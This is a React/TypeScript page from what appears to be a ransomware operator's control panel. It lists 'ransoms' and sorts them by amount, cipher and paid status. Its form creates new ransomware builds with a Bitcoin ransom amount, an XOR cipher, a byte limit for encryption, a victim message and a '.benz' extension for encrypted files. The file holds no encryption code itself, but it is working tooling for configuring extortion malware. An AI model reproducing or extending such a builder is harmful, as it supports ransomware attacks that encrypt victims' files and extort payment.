import {useAllRansoms, useCreatePremakeRansom} from "../../api/ransomApi";
import Ransom from "../../model/ransom";
import {RevealLi} from "../../components/widgets/reveal/reveal";
import ComputerLine from "../../components/widgets/computerLine/computerLine";
import Loading from "../../components/loading/loading";
import {FontAwesomeIcon} from "@fortawesome/react-fontawesome";
import {faArrowDown} from "@fortawesome/free-solid-svg-icons";
import {FormEvent, FormEventHandler, useEffect, useState} from "react";
import "./fullHistory.css";
import {CipherType, cipherTypeFromString} from "../../model/cipherType";
import FrameButton from "../../components/button/frameButton";
import Modal from "../../components/modal/modal";
import TextInput from "../../components/textInput/textInput";
import {CryptoType, cryptoTypeFromString} from "../../model/cryptoType";
import {useAllCiphers} from "../../api/cipherApi";
import {useAllCryptos} from "../../api/cryptoApi";
import SelectBox from "../../components/selectBox/selectBox";
import {isExtension, isFloat} from "../../helper/onlyNumber";

enum SortingCriterion {
    Label,
    CryptoAmount,
    CipherType,
    Paid,
}

export default function RansomsPage() {
    return (
        <div className={"container flex flex-col mx-auto min-h-screen w-full"}>
            <RansomsTitle/>
            <Ransoms/>
        </div>
    );
}

function RansomsTitle() {
    const [isCreating, setIsCreating] = useState<boolean>(false);
    const [creationRansom, setCreationRansom] = useState<Ransom | null>(null);

    return (
        <div className={"mb-4"}>
            <h2 className={"text-3xl mb-4"}>Ransoms</h2>
            <FrameButton onClick={() => setIsCreating(true)} text={"Create ransom"}></FrameButton>
            <Modal
                show={isCreating}
                handleClose={() => setIsCreating(false)}
                title={"Create ransom"}
                size={"m"}>
                <CreateRansomForm onCreated={() => setIsCreating(false)} onChange={(ransom: Ransom) => setCreationRansom(ransom)} />
            </Modal>
        </div>
    );
}

interface CreateRansomFormProps {
    onChange: (ransom: Ransom) => void;
    onCreated: () => void;
}

function CreateRansomForm({ onChange, onCreated }: CreateRansomFormProps) {
    const [cryptoAmount, setCryptoAmount] = useState<string>("0.3");
    const [maxEncrypt, setMaxEncrypt] = useState<number>(4194304);
    const [cipherType, setCipherType] = useState<string>(CipherType[CipherType.XOR]);
    const [message, setMessage] = useState<string>("Sorry it happened to you!");
    const [description, setDescription] = useState<string>("");
    const [name, setName] = useState<string>("");
    const [cryptoType, setCryptoType] = useState<string>("BTC");
    const [extension, setExtension] = useState<string>(".benz");

    const { data: cipherData } = useAllCiphers();
    const { data: cryptoData } = useAllCryptos();

    const premakeCreation = useCreatePremakeRansom({});

    const createRansom = (evt: FormEvent) => {
        evt.preventDefault();
        const ransom = new Ransom();
        ransom.cryptoAmount = Number(cryptoAmount);
        ransom.cipherType = cipherTypeFromString(cipherType);
        ransom.message = message;
        ransom.description = description;
        ransom.name = name;
        ransom.cryptoType = cryptoTypeFromString(cryptoType);
        ransom.maxEncrypt = maxEncrypt;
        ransom.extension = extension;

        premakeCreation.mutate(ransom);
        onCreated();
    };

    return (
        <form onSubmit={createRansom} className={"flex flex-col"}>
            <div className={"flex flex-row"}>
                <div className={"flex flex-col mr-2 w-1/3"}>
                    <div className={"flex flex-row"}>
                        <TextInput name={"Ransom"} value={cryptoAmount.toString()} onChange={setCryptoAmount} type={"text"} valueHook={isFloat} />
                        <SelectBox name={"Crypto"} value={cryptoType} options={cryptoData?.data?.map((c) => ({value: c.id, label: c.name})) ?? []} onChange={setCryptoType} />
                    </div>
                    <SelectBox name={"Cipher type"} value={cipherType} options={cipherData?.data?.map((c) => ({value: c.id, label: c.name})) ?? []} onChange={setCipherType} />
                </div>
                <div className={"flex flex-col ml-2 w-1/3"}>
                    <TextInput name={"Name"} value={name} onChange={setName} />
                    <TextInput name={"Description"} value={description} onChange={setDescription} />
                    <TextInput name={"Message"} value={message} onChange={setMessage} />
                    <TextInput name={"Extension"} value={`.${extension.replace(".", "")}`} onChange={setExtension} valueHook={isExtension} />
                </div>
            </div>
            <FrameButton text={"Create"} type={"submit"} className={"ml-auto"} />
        </form>
    );
}

function Ransoms() {
    const { isLoading, error, data: computers } = useAllRansoms();
    const [criterion, setCriterion] = useState<SortingCriterion>(SortingCriterion.Label);
    const [desc, setDesc] = useState(true);

    const onChangeSort = (c: SortingCriterion) => {
        if(criterion === c) {
            setDesc(!desc);
        }
        else {
            setCriterion(c);
            setDesc(true);
        }
    };

    return (
        <>
            <RansomsSort onChangeSort={onChangeSort} item={criterion} desc={desc} />
            {isLoading && <Loading className={"m-auto self-center"}/>}
            {!isLoading && !error && (
                <ul className={"w-full"}>
                    {(computers?.data ?? [])
                        // filter((ransom: Ransom) => search == "" || h.cryptocurrencySymbol.toLowerCase().includes(search) || h.registerTime.includes(search)).
                        .sort((a: Ransom, b: Ransom) => {
                            switch(criterion) {
                                case SortingCriterion.Label:
                                    const aLabel = a.name ?? a.id;
                                    const bLabel = b.name ?? b.id;
                                    return desc ? aLabel.localeCompare(bLabel) : bLabel.localeCompare(aLabel);
                                case SortingCriterion.CryptoAmount:
                                    return desc ? (a.cryptoAmount - b.cryptoAmount) : (b.cryptoAmount - a.cryptoAmount);
                                case SortingCriterion.CipherType:
                                    return desc ? CipherType[a.cipherType].localeCompare(CipherType[b.cipherType]) : CipherType[b.cipherType].localeCompare(CipherType[a.cipherType]);
                                case SortingCriterion.Paid:
                                    return desc ? (Number(a.paid) - Number(b.paid)) : (Number(b.paid) - Number(a.paid));
                            }
                            
                            return 0;
                        })
                        .map((ransom: Ransom, idx: number) => (
                            <RevealLi
                                id={ransom.id}
                                key={idx}>
                                <ComputerLine
                                    odd={idx % 2 === 0}
                                    computer={ransom}
                                />
                            </RevealLi>
                        ))}
                </ul>
            )}
        </>);
}

interface RansomsSortProps {
    item: SortingCriterion;
    desc: boolean;
    onChangeSort: (criterion: SortingCriterion) => void;
}

function RansomsSort({ item, desc, onChangeSort }: RansomsSortProps) {
    let descClass = desc ? "order-desc" : "order-asc";

    return (
        <RevealLi className="flex flex-col md:flex-row bg-main-back w-full p-4 justify-space bg-transparent" id={"sort-line"}>
            <span className="before:font-bold md:before:mr-4 before:text-primary w-6/12 cursor-pointer" onClick={() => { onChangeSort(SortingCriterion.Label); }}>Label{item === SortingCriterion.Label && <FontAwesomeIcon className={`ml-4 ${descClass}`} icon={faArrowDown}/>}</span>
            <span className="w-2/12 cursor-pointer" onClick={() => { onChangeSort(SortingCriterion.CryptoAmount); }}>Amount{item === SortingCriterion.CryptoAmount && <FontAwesomeIcon className={`ml-4 ${descClass}`} icon={faArrowDown}/>}</span>
            <span className="w-2/12 cursor-pointer" onClick={() => { onChangeSort(SortingCriterion.CipherType); }}>Cipher{item === SortingCriterion.CipherType && <FontAwesomeIcon className={`ml-4 ${descClass}`} icon={faArrowDown}/>}</span>
            <span className="w-2/12 cursor-pointer" onClick={() => { onChangeSort(SortingCriterion.Paid); }}>Paid{item === SortingCriterion.Paid && <FontAwesomeIcon className={`ml-4 ${descClass}`} icon={faArrowDown}/>}</span>
        </RevealLi>
    );
}